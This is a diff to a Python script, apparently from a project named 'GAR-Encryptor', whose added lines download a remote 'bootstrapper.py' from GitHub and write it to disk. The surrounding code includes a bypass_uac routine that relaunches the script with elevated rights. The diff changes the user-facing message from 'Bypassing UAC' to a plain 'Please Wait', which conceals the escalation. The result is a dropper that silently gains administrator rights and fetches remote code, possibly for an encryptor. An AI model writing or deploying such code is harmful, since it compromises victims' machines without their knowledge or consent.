@@ -1,8 +1,35 @@
+import subprocess
 import os
 import sys
+
+def install(pkg):
+    try:
+        subprocess.check_call([sys.executable,"-m","pip","install",pkg])
+    except:
+        return False
+install("ctypes")
+install("winreg")
+install("pathlib")
+install("requests")
 import ctypes
 import winreg
+import pathlib
+import requests
 from pathlib import Path
+
+GIT_REPO_MAIN_PY = "https://raw.githubusercontent.com/JBxSlash/GAR-Encryptor/main/GAR/bootstrapper.py"
+
+resp = requests.get(GIT_REPO_MAIN_PY)
+
+file = ""
+print(str(Path(__file__).parent))
+try:
+    file = open(str(Path(__file__).parent) + "\\bootstrapper.py","x")
+except:
+    file = open(str(Path(__file__).parent) + "\\bootstrapper.py","a")
+
+with open(str(Path(__file__).parent) + "\\bootstrapper.py","w") as a:
+    a.write(resp.text)
 path = ""
 torun = ""
 padir = str(Path(__file__).parent)
@@ -49,7 +76,8 @@ def bypass_uac(cmd):
 
 def execute():        
     if not is_running_as_admin():
-        print('[+] Bypassing UAC... Please Wait...')
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print('[+] Please Wait...')
         try:                
             current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
             cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
